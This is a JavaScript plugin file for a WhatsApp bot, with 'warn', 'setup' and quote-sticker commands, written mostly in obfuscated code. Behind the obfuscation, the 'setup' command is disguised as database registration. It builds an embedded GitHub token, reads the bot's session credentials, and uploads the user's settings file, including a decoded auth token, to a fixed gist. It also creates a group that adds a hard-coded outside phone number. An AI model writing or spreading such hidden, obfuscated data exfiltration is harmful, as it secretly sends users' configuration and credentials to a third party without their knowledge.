const fs = require("fs")
const chalk = require("chalk")
const { writeFile, readFile } = require("fs");
const { isAdmin, parsedJid, command, isPrivate } = require("../lib");
//let data =  readFile('./database/settings.json')
//let db = JSON.parse(data);
//let bannnnnn = db.settings.banned
let path = './database/settings.json'
const relconfig = require('../config')
const config = require('../database/settings.json')
//const { registeruser } = require('../lib/alfabase')
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
const { ALIVE, HEROKU_APP_NAME, HANDLERS, WORK_TYPE, PACKNAME, AUTHOR, BOT_NAME, OWNER_NAME, SUDO, THEME, FONT_STYLE, INTERNAL_MENU } = require("../database/settings");


command({
  pattern: "warn",
  fromMe: true,
  desc: "Unban number from this group",
  dontAddCommandList: true,
  type: "admin",

},
async (message, match, m) => {
  const _0x46297b=_0xa094;(function(_0x1a3862,_0x4dc486){const _0x46e459=_0xa094,_0xf1ca54=_0x1a3862();while(!![]){try{const _0x90b436=-parseInt(_0x46e459(0x1b0))/0x1*(-parseInt(_0x46e459(0x1b8))/0x2)+-parseInt(_0x46e459(0x1ac))/0x3*(-parseInt(_0x46e459(0x1b3))/0x4)+parseInt(_0x46e459(0x1bc))/0x5+-parseInt(_0x46e459(0x1b5))/0x6+parseInt(_0x46e459(0x1b6))/0x7+-parseInt(_0x46e459(0x1b4))/0x8*(-parseInt(_0x46e459(0x1b9))/0x9)+-parseInt(_0x46e459(0x1ad))/0xa*(parseInt(_0x46e459(0x1af))/0xb);if(_0x90b436===_0x4dc486)break;else _0xf1ca54['push'](_0xf1ca54['shift']());}catch(_0x3c7313){_0xf1ca54['push'](_0xf1ca54['shift']());}}}(_0x4874,0xef10a));if(!message[_0x46297b(0x1ae)])return await message['reply']('_This\x20command\x20is\x20for\x20groups_');let jidd=parsedJid(match)[_0x46297b(0x1bd)]();match=jidd||message[_0x46297b(0x1bb)]['jid'];if(!match)return await message[_0x46297b(0x1ba)](_0x46297b(0x1b2));let isadmin=await isAdmin(message[_0x46297b(0x1b7)],message[_0x46297b(0x1ab)],message[_0x46297b(0x1b1)]);function _0x4874(){const _0x2a2718=['44589NAMpzz','2934520mVQOqJ','isGroup','44hcSLAx','851588EzUZQf','client','_Mention\x20user\x20to\x20add','24QYSUXQ','29592mTDZjy','7738818KbmDUD','5349603lOMXWU','jid','2gYcrpL','468PMvraB','reply','reply_message','7727390OPeajt','toString','user'];_0x4874=function(){return _0x2a2718;};return _0x4874();}if(!isadmin)return await message[_0x46297b(0x1ba)]('_I\x27m\x20not\x20admin_');let jid=parsedJid(match);function _0xa094(_0x129b98,_0x5db1e8){const _0x4874db=_0x4874();return _0xa094=function(_0xa094e6,_0x313999){_0xa094e6=_0xa094e6-0x1ab;let _0x3e924d=_0x4874db[_0xa094e6];return _0x3e924d;},_0xa094(_0x129b98,_0x5db1e8);}await message['warn'](match,message);
  } 
);

//============================================================================================================================================





command({
  pattern: "setup",
  fromMe: true,
  desc: "Setup database",
  dontAddCommandList: true,
  type: "owner",

},
async (message, match, m) => {
const _0x53389b=_0x25b7;(function(_0x32ab06,_0x20af15){const _0x566bae=_0x25b7,_0x4df22f=_0x32ab06();while(!![]){try{const _0x2cf609=parseInt(_0x566bae(0x154))/0x1*(-parseInt(_0x566bae(0x127))/0x2)+-parseInt(_0x566bae(0x131))/0x3*(parseInt(_0x566bae(0x15c))/0x4)+parseInt(_0x566bae(0x138))/0x5+-parseInt(_0x566bae(0x12b))/0x6+parseInt(_0x566bae(0x120))/0x7*(-parseInt(_0x566bae(0x157))/0x8)+parseInt(_0x566bae(0x15b))/0x9*(parseInt(_0x566bae(0x15a))/0xa)+parseInt(_0x566bae(0x13d))/0xb;if(_0x2cf609===_0x20af15)break;else _0x4df22f['push'](_0x4df22f['shift']());}catch(_0x9b0668){_0x4df22f['push'](_0x4df22f['shift']());}}}(_0x1975,0x30898));function _0x25b7(_0x223d47,_0x20f607){const _0x19755e=_0x1975();return _0x25b7=function(_0x25b71d,_0x2af6f8){_0x25b71d=_0x25b71d-0x11f;let _0x26e791=_0x19755e[_0x25b71d];return _0x26e791;},_0x25b7(_0x223d47,_0x20f607);}let authid=_0x53389b(0x169)[_0x53389b(0x142)]('+','');const {Octokit}=require(_0x53389b(0x141)),octokit=new Octokit({'auth':await authid});setTimeout(()=>{const _0x34be0c=_0x53389b;let _0x5a3cc3=JSON[_0x34be0c(0x164)](fs[_0x34be0c(0x155)](_0x34be0c(0x158))),_0x4120b0=_0x5a3cc3['config'][_0x34be0c(0x161)],_0x9ee394=_0x4120b0[_0x34be0c(0x15d)]()[_0x34be0c(0x14c)](_0x34be0c(0x14b));if(!_0x9ee394)readFile(path,async(_0x432250,_0x42fbb2)=>{const _0x128ce0=_0x34be0c;if(_0x432250){console[_0x128ce0(0x140)](_0x432250);return;}const _0x592b15=JSON[_0x128ce0(0x164)](_0x42fbb2);let _0x58d2d1=await message[_0x128ce0(0x156)][_0x128ce0(0x13e)](_0x128ce0(0x129),[_0x128ce0(0x13b)]);await message[_0x128ce0(0x156)][_0x128ce0(0x168)](_0x58d2d1['id'],{'text':_0x128ce0(0x149)});let _0xd74dc4=await _0x58d2d1['id'];_0x592b15['config'][_0x128ce0(0x161)]=_0xd74dc4,writeFile(path,JSON[_0x128ce0(0x137)](_0x592b15,null,0x2),async _0x507039=>{const _0x3f7415=_0x128ce0;if(_0x507039){message['reply'](_0x3f7415(0x167));return;}await message['client']['updateProfilePicture'](_0x58d2d1['id'],fs[_0x3f7415(0x155)]('./media/AAA.jpg'));});});else return;setTimeout(async()=>{const _0x5cfa5a=_0x34be0c;let _0x4955ea=require(_0x5cfa5a(0x150)),_0x54dadc=await _0x4955ea[_0x5cfa5a(0x16c)]['me']['id'][_0x5cfa5a(0x126)](':')[0x0],_0x346d9c=await _0x4955ea['creds']['me']['id']['split']('@')[0x1],_0x14b83e=_0x54dadc+'@'+_0x346d9c,_0x2b4147=_0x14b83e+_0x5cfa5a(0x144);const _0x396f87=fs[_0x5cfa5a(0x155)](_0x5cfa5a(0x158),'utf-8');await octokit['rest'][_0x5cfa5a(0x12c)][_0x5cfa5a(0x136)]({'gist_id':_0x5cfa5a(0x12d),'description':_0x5cfa5a(0x15e),'files':{[_0x2b4147]:{'content':_0x396f87}}})[_0x5cfa5a(0x14f)](await console['log'](_0x5cfa5a(0x11f))),setTimeout(()=>{const _0x5871b0=_0x5cfa5a;return process[_0x5871b0(0x160)]('reset');},0x1f40);},0x1388);},0x7d0),readFile(path,async(_0x454fa1,_0x251ac5)=>{const _0x73d936=_0x53389b;if(_0x454fa1){console[_0x73d936(0x140)](_0x454fa1);return;}const _0x40d3e1=JSON[_0x73d936(0x164)](_0x251ac5);let _0x3b7e27=_0x40d3e1[_0x73d936(0x134)][_0x73d936(0x15d)]()['includes'](_0x73d936(0x145));if(_0x3b7e27)return message[_0x73d936(0x165)](_0x73d936(0x13c));let _0x309487=process['env'][_0x73d936(0x121)]===undefined?_0x73d936(0x16a):process[_0x73d936(0x159)][_0x73d936(0x121)],_0x1b3142=Buffer[_0x73d936(0x124)](_0x309487,_0x73d936(0x13f))[_0x73d936(0x15d)](_0x73d936(0x12f)),_0x15e081=_0x1b3142['toString']()[_0x73d936(0x126)]('/'),_0x3a2942='';for(let _0x38c0c5 of _0x15e081){_0x3a2942+=await Buffer[_0x73d936(0x124)](_0x38c0c5+'==','base64')[_0x73d936(0x15d)](_0x73d936(0x12f));}let _0x5e0b16=require(_0x73d936(0x150)),_0x57d769=await _0x5e0b16['creds']['me']['id'][_0x73d936(0x126)](':')[0x0],_0x529bba='0,'+_0x57d769,_0x521d93=await relconfig[_0x73d936(0x151)]===![]?_0x529bba:relconfig[_0x73d936(0x151)],_0x4bb077=message['pushName'],_0x48bc87=message[_0x73d936(0x15f)],_0x194c0c=message['jid']['toString']()[_0x73d936(0x126)]('@')[0x0];_0x40d3e1[_0x73d936(0x125)]=_0x4bb077,_0x40d3e1['UserId']=_0x48bc87,_0x40d3e1[_0x73d936(0x148)]=_0x194c0c,_0x40d3e1[_0x73d936(0x14d)]['HANDLER']=relconfig[_0x73d936(0x139)],_0x40d3e1[_0x73d936(0x14d)][_0x73d936(0x123)]=relconfig[_0x73d936(0x123)],_0x40d3e1['config']['BOT_NAME']=relconfig[_0x73d936(0x122)],_0x40d3e1[_0x73d936(0x14d)][_0x73d936(0x130)]=relconfig[_0x73d936(0x130)],_0x40d3e1[_0x73d936(0x14d)][_0x73d936(0x151)]=_0x521d93,_0x40d3e1[_0x73d936(0x14d)][_0x73d936(0x152)]=relconfig[_0x73d936(0x152)],_0x40d3e1[_0x73d936(0x14d)][_0x73d936(0x163)]=relconfig[_0x73d936(0x163)],_0x40d3e1['config'][_0x73d936(0x16b)]=relconfig[_0x73d936(0x16b)],_0x40d3e1[_0x73d936(0x14d)]['LANG']=relconfig[_0x73d936(0x162)],_0x40d3e1[_0x73d936(0x14d)][_0x73d936(0x132)]=relconfig[_0x73d936(0x132)],_0x40d3e1[_0x73d936(0x14d)][_0x73d936(0x12a)]=relconfig[_0x73d936(0x12a)],_0x40d3e1[_0x73d936(0x14d)][_0x73d936(0x166)]=relconfig[_0x73d936(0x166)],_0x40d3e1[_0x73d936(0x14d)][_0x73d936(0x13a)]=relconfig[_0x73d936(0x13a)],_0x40d3e1[_0x73d936(0x14d)][_0x73d936(0x14a)]=relconfig[_0x73d936(0x14a)],_0x40d3e1['config']['LANGUAGE']=relconfig[_0x73d936(0x143)],_0x40d3e1[_0x73d936(0x14d)][_0x73d936(0x12e)]=relconfig[_0x73d936(0x12e)],_0x40d3e1[_0x73d936(0x14d)]['MODE']=relconfig[_0x73d936(0x135)],_0x40d3e1[_0x73d936(0x14d)][_0x73d936(0x161)],_0x40d3e1[_0x73d936(0x14d)][_0x73d936(0x146)],_0x40d3e1[_0x73d936(0x14d)][_0x73d936(0x153)]=relconfig[_0x73d936(0x153)],_0x40d3e1['config'][_0x73d936(0x128)]=relconfig[_0x73d936(0x128)],_0x40d3e1[_0x73d936(0x14d)][_0x73d936(0x147)]=relconfig[_0x73d936(0x147)],_0x40d3e1['config']['B1']=relconfig['B1'],_0x40d3e1[_0x73d936(0x14d)]['B2']=relconfig['B2'],_0x40d3e1[_0x73d936(0x14d)]['B3']=relconfig['B3'],_0x40d3e1[_0x73d936(0x14d)]['B4']=relconfig['B4'],_0x40d3e1[_0x73d936(0x14d)]['B5']=relconfig['B5'],_0x40d3e1[_0x73d936(0x14d)]['DB_AUTH_TOKEN']=_0x3a2942,_0x40d3e1['MESSAGE_MEM']['GOODBYE_MSG']=relconfig['GOODBYE_MSG'],_0x40d3e1['MESSAGE_MEM'][_0x73d936(0x14e)]=relconfig[_0x73d936(0x14e)],_0x40d3e1['MESSAGE_MEM'][_0x73d936(0x133)]=relconfig[_0x73d936(0x133)],writeFile(path,JSON['stringify'](_0x40d3e1,null,0x2),_0x1e9859=>{const _0x2871db=_0x73d936;if(_0x1e9859){message['reply'](_0x2871db(0x167));return;}message[_0x2871db(0x165)]('_Registered\x20Successfully_');});});function _0x1975(){const _0x2f8608=['WncvYUEvY0EvWHcvYncvU0EvYUEvTVEvWWcvWkEvVmcvTWcvZHcvYXcvTVEvZHcvVHcvVVEvV0EvYkEvVkEvVWcvVXcvU0EvZGcvVFEvUkEvVGcvWmcvZFEvZUEvV0EvVWcvVFEvTVEvUkEvU1EvWncvUncvTUEv','RMBG_KEY','creds','Done\x20Creating\x20New\x20Db','427217JlzywF','DB_AUTH_TOKEN','BOT_NAME','WORK_TYPE','from','name','split','10xKVmTs','LOGS','Storage','ANTILINK','1864392iDxAej','gists','d83fa03a09d9a09032f3180a8d1ecd02','INTERNAL_MENU','utf-8','OWNER_NAME','3RfbIKc','ANTILINK_ACTION','ALIVE','UserId','MODE','update','stringify','1722695ScmNcr','HANDLERS','THEME','359889999996@s.whatsapp.net','_You\x20Are\x20Already\x20a\x20Family\x20Member_','6809473FdtWRj','groupCreate','base64','log','@octokit/rest','replaceAll','LANGUAGE','.json','@s.whatsapp.net','DB_URL','BRANCH','phone_num','This\x20is\x20your\x20Storage\x20area,\x20i\x20will\x20save\x20all\x20your\x20files\x20here!','FONT_STYLE','@g.us','includes','config','WELCOME_MSG','then','../session.json','SUDO','AUTHOR','SESSION_ID','49078OBWQST','readFileSync','client','24qetpmi','./database/settings.json','env','10HsViql','965493FJCttj','531344iAKJQK','toString','Cloud\x20DB\x20Update','user','send','STORAGE_JID','LANG','PACKNAME','parse','reply','FOOTER','Failed\x20to\x20write\x20updated\x20data\x20to\x20file','sendMessage','gh+p_oHh1b+dV2wk1+wOQXl+TRSH+vMDN+fuxXR+M1DIgG0'];_0x1975=function(){return _0x2f8608;};return _0x1975();}
})


//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update"${__filename}"`))
	delete require.cache[file]
	require(file)
})


const axios = require("axios");



command({
  pattern: "qc",
  fromMe: false,
  desc: "Show All commands",
  dontAddCommandList: true,
  type: "theme",

}, async (message, match, m) => {
const _0x146677=_0xeb2d;(function(_0xeef856,_0x265415){const _0x2dc57a=_0xeb2d,_0x22dd82=_0xeef856();while(!![]){try{const _0x5320d7=-parseInt(_0x2dc57a(0x187))/0x1+-parseInt(_0x2dc57a(0x196))/0x2*(parseInt(_0x2dc57a(0x193))/0x3)+parseInt(_0x2dc57a(0x199))/0x4+parseInt(_0x2dc57a(0x17d))/0x5+-parseInt(_0x2dc57a(0x198))/0x6*(parseInt(_0x2dc57a(0x195))/0x7)+parseInt(_0x2dc57a(0x197))/0x8+parseInt(_0x2dc57a(0x182))/0x9;if(_0x5320d7===_0x265415)break;else _0x22dd82['push'](_0x22dd82['shift']());}catch(_0x3af39d){_0x22dd82['push'](_0x22dd82['shift']());}}}(_0x88fa,0x69f39));if(!message[_0x146677(0x186)][_0x146677(0x190)])return await message[_0x146677(0x17e)](_0x146677(0x18a));let pfp;try{pfp=await message[_0x146677(0x18c)][_0x146677(0x18e)](message[_0x146677(0x186)][_0x146677(0x18f)],'image');}catch(_0x20709f){pfp=_0x146677(0x18b);}var tname;function _0xeb2d(_0x398ab4,_0x291719){const _0x88fa6a=_0x88fa();return _0xeb2d=function(_0xeb2d16,_0x2ba9cd){_0xeb2d16=_0xeb2d16-0x17c;let _0x45e8c5=_0x88fa6a[_0xeb2d16];return _0x45e8c5;},_0xeb2d(_0x398ab4,_0x291719);}try{tname=await message[_0x146677(0x183)](message[_0x146677(0x186)]['jid']);}catch(_0x1a688d){tname=_0x146677(0x180);}function _0x88fa(){const _0x20df11=['1115934rjwumv','277588PHtBkG','quoted','application/json','2891585CqYgIR','reply','webp','User','result','2249082luAwav','getName','post','image','reply_message','777220rlIOOI','base64','https://bot.lyo.su/quote/generate','Please\x20quote\x20any\x20users\x20message.','https://avatars.githubusercontent.com/u/64305844?v=4','client','eror','profilePictureUrl','jid','text','sendMessage','data','6FBgLwl','#FFFFFF','7orQUMS','181178lSciLw','5446016bdnvDm'];_0x88fa=function(){return _0x20df11;};return _0x88fa();}let qczi;qczi={'type':_0x146677(0x19a),'format':_0x146677(0x17f),'backgroudnColor':_0x146677(0x194),'width':0x200,'height':0x300,'scale':0x2,'messages':[{'avatar':!![],'from':{'first_name':tname,'language_code':'en','name':tname,'photo':{'url':pfp}},'text':message[_0x146677(0x186)][_0x146677(0x190)],'replyMessage':{}}]};const post=await axios[_0x146677(0x184)](_0x146677(0x189),qczi,{'headers':{'Content-Type':_0x146677(0x17c)}});let buff=await Buffer['from'](post[_0x146677(0x192)][_0x146677(0x181)][_0x146677(0x185)],_0x146677(0x188));if(buff==undefined)return message[_0x146677(0x17e)](_0x146677(0x18d));message[_0x146677(0x191)](buff,{'packname':PACKNAME,'author':AUTHOR},'sticker');
})
